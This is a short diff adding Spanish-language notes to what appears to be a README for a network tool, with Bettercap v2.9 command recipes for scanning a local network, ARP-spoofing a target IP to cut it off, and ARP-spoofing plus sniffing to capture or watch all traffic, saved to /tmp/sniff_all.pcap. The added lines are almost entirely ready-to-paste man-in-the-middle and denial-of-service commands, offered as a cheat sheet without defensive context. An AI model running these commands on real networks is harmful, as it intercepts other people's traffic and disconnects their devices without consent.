@@ -18,4 +18,18 @@ chmod 777 netspy
 
 sh netspy
 
+# Bettercap v2.9
+
+Escanear toda la Red:
+net.probe on; ticker on
+
+Banear tarjet IP con ARP:
+set arp.spoof.targets IP; arp.spoof on; set arp.ban on; net.probe on
+
+Capturar trafico en fichero siff_all.pcap:
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sniff_all.pcap; set net.sniff.verbose false; net.sniff on
+
+Ver Trafico:
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on
+
 www.hackingyseguridad.com
